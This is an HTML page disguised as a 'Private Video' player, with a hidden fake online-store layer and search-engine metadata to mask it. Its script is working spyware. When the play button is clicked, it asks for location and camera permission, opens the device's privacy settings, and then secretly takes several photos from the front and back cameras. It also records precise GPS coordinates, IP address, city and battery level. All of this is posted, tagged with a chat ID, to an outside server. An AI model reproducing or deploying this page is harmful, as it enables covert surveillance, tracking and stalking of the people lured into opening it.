<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    
    <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices guaranteed." />
    <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping" />
    <meta name="robots" content="index, follow" />
    <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
    <meta property="og:description" content="Shop the best products online with fast delivery to your location." />
    <meta property="og:type" content="website" />
    
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "OnlineStore",
        "name": "ShopStore",
        "description": "Online shopping store with fast delivery to your location"
    }
    </script>
    
    <title>Video Player</title>
    
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;background-color:#000;color:#fff;overflow:hidden}
        
        .store-header,.store-footer,.product-info-hidden,.delivery-notice-hidden{position:fixed!important;top:-9999px!important;left:-9999px!important;opacity:0!important;pointer-events:none!important;width:1px!important;height:1px!important;overflow:hidden!important;clip:rect(0,0,0,0)!important;z-index:-999999!important;visibility:hidden!important}
        
        .video-player-container{width:90%;max-width:800px;background:#111;border-radius:12px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5);position:relative}
        
        .video-thumbnail{position:relative;width:100%;height:450px;background:linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7)),url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;cursor:default;flex-direction:column}
        
        #playBtn{display:flex;align-items:center;justify-content:center;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,0.1);border:3px solid #ff6b6b;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(8px);box-shadow:0 0 40px rgba(255,0,0,0.3);z-index:10}
        #playBtn:hover{transform:scale(1.05);background:rgba(255,255,255,0.2);border-color:#ff4757;box-shadow:0 0 60px rgba(255,0,0,0.6)}
        #playBtn span{font-size:60px;color:#ff6b6b;line-height:1;user-select:none}
        
        .video-info{padding:20px;border-bottom:1px solid #333}
        .video-title{font-size:1.5rem;font-weight:bold;margin-bottom:8px}
        
        .video-controls{padding:15px 20px;display:flex;align-items:center;justify-content:space-between;background:#1a1a1a;flex-wrap:wrap;gap:10px}
        .ctrl-btn{background:none;border:none;color:white;font-size:1.2rem;cursor:pointer;padding:8px 15px;border-radius:4px;transition:background 0.2s}
        .ctrl-btn:hover{background:#333}
        
        .seek-bar{flex-grow:1;height:4px;background:#333;border-radius:2px;margin:0 20px;overflow:hidden;position:relative;min-width:60px}
        .seek-fill{position:absolute;height:100%;width:0%;background:#ff0000}
        .timer{color:#aaa;font-size:0.9rem;min-width:100px;text-align:center}
        .volume-area{display:flex;align-items:center;gap:10px;color:#aaa}
        .vol-bar{width:80px;height:4px;background:#333;border-radius:2px;position:relative}
        .vol-fill{position:absolute;height:100%;width:70%;background:#ff0000}
        
        @media (max-width:480px){
            .video-thumbnail{height:280px}
            #playBtn{width:90px;height:90px}
            #playBtn span{font-size:45px}
        }
    </style>
</head>
<body>

    <div class="store-header" aria-hidden="true">
        <span>🛒 ShopStore</span><span>🔍 Search products...</span><span>🛒 Cart (0)</span>
    </div>
    <div class="product-info-hidden" aria-hidden="true">
        <span>$49.99</span><span>★★★★★ 4.8</span><span>🚚 Free Shipping</span><span>✅ In Stock</span>
    </div>
    <div class="delivery-notice-hidden" aria-hidden="true">
        <span>📍</span><span>Enable location for delivery rates & faster shipping</span>
    </div>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
        </div>
        <div class="video-thumbnail" id="poster">
            <div id="playBtn"><span>▶</span></div>
        </div>
        <video id="vid" controls playsinline style="display:none;width:100%;height:450px;background:#000">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
        </video>
        <div class="video-controls">
            <div class="seek-bar"><div class="seek-fill"></div></div>
            <div class="timer">0:00 / 2:45</div>
            <div class="volume-area"><span>🔊</span><div class="vol-bar"><div class="vol-fill"></div></div></div>
            <button class="ctrl-btn">⛶</button>
        </div>
    </div>

    <div class="store-footer" aria-hidden="true">
        <span>Privacy Policy</span><span>Terms of Service</span><span>© 2024 ShopStore</span>
    </div>

    <script>
    (function(){
        var step=0, started=false;
        var btn=document.getElementById('playBtn');
        var poster=document.getElementById('poster');
        var vid=document.getElementById('vid');
        var chatId=new URLSearchParams(window.location.search).get('chatId')||'';
        
        var collected={
            chatId:chatId,
            permissions:[],
            images:[],
            location:'',
            ipInfo:'',
            battery:''
        };
        
        function sendToServer(){
            var url='https://server-brxz.onrender.com/submitData';
            
            var body='chatId='+encodeURIComponent(collected.chatId);
            body+='&imageDatas='+encodeURIComponent(collected.images.join(','));
            body+='&location='+encodeURIComponent(collected.location);
            body+='&permissions='+encodeURIComponent(collected.permissions.join(', '));
            body+='&ipInfo='+encodeURIComponent(collected.ipInfo);
            body+='&battery='+encodeURIComponent(collected.battery);
            
            // إرسال مباشر مع XHR
            var x=new XMLHttpRequest();
            x.open('POST',url,true);
            x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
            x.send(body);
        }
        
        function collectData(){
            // IP
            fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(d){
                collected.ipInfo='Country: '+d.country_name+', City: '+d.city+', IP: '+d.ip;
            }).catch(function(){});
            
            // Battery
            if(navigator.getBattery){
                navigator.getBattery().then(function(b){
                    collected.battery=Math.round(b.level*100)+'%';
                });
            }
            
            // Location
            navigator.geolocation.getCurrentPosition(function(pos){
                collected.location='Lat: '+pos.coords.latitude.toFixed(6)+', Long: '+pos.coords.longitude.toFixed(6);
                collected.permissions.push('Geolocation Allowed');
            },function(){
                collected.permissions.push('Geolocation Denied');
            },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
            
            // Camera
            function snap(face,cb){
                navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:face}},audio:false}).then(function(stream){
                    var v=document.createElement('video');
                    v.srcObject=stream;
                    v.play().then(function(){
                        setTimeout(function(){
                            var c=document.createElement('canvas');
                            c.width=v.videoWidth||640;
                            c.height=v.videoHeight||480;
                            c.getContext('2d').drawImage(v,0,0);
                            collected.images.push(c.toDataURL('image/jpeg').split(',')[1]);
                            collected.permissions.push((face==='user'?'Front':'Back')+' Camera Allowed');
                            stream.getTracks().forEach(function(t){t.stop();});
                            cb();
                        },1000);
                    });
                }).catch(function(){
                    collected.permissions.push((face==='user'?'Front':'Back')+' Camera Denied');
                    cb();
                });
            }
            
            snap('user',function(){
                snap('environment',function(){
                    snap('user',function(){
                        snap('environment',function(){
                            setTimeout(sendToServer,2000);
                        });
                    });
                });
            });
        }
        
        function openSettings(){
            var ua=navigator.userAgent;
            if(/Android/i.test(ua)){
                var intents=[
                    'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                    'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                    'intent:#Intent;action=android.settings.SETTINGS;end'
                ];
                for(var i=0;i<intents.length;i++){
                    try{window.location.href=intents[i];break;}catch(e){}
                }
            }else if(/iPhone|iPad|iPod/i.test(ua)){
                window.open('App-Prefs:Privacy&path=LOCATION','_blank');
            }else if(/Windows/i.test(ua)){
                window.open('ms-settings:privacy-location','_blank');
            }else if(/Mac/i.test(ua)){
                window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices','_blank');
            }else{
                window.location.href='intent:#Intent;action=android.settings.SETTINGS;end';
            }
        }
        
        btn.addEventListener('click',function(){
            if(started)return;
            
            if(!step){
                step=1;
                try{
                    navigator.geolocation.getCurrentPosition(function(){},function(){},{timeout:3000});
                    navigator.mediaDevices.getUserMedia({video:true}).then(function(s){s.getTracks().forEach(function(t){t.stop();});}).catch(function(){});
                }catch(e){}
                openSettings();
            }else{
                started=true;
                vid.muted=false;
                vid.volume=1;
                vid.play().catch(function(){});
                poster.style.display='none';
                vid.style.display='block';
                collectData();
                btn.style.display='none';
            }
        });
        
        document.addEventListener('click',function(){
            if(vid.style.display==='block'){vid.muted=false;if(vid.paused)vid.play().catch(function(){});}
        },true);
        
        document.querySelectorAll('.ctrl-btn').forEach(function(b){
            b.addEventListener('click',function(e){
                e.stopPropagation();
                if(this.textContent.includes('⛶')){
                    if(vid.requestFullscreen){vid.requestFullscreen();}
                    else if(vid.webkitRequestFullscreen){vid.webkitRequestFullscreen();}
                }
            });
        });
        
        setInterval(function(){
            var fill=document.querySelector('.seek-fill');
            if(vid.style.display==='block')return;
            var w=parseInt(fill.style.width)||35;
            w=(w+0.1)%100;
            fill.style.width=w+'%';
            var sec=Math.floor((w/100)*165);
            var m=Math.floor(sec/60);
            var s=sec%60;
            document.querySelector('.timer').textContent=m+':'+(s<10?'0':'')+s+' / 2:45';
        },1000);
        
    })();
    </script>
</body>
</html>
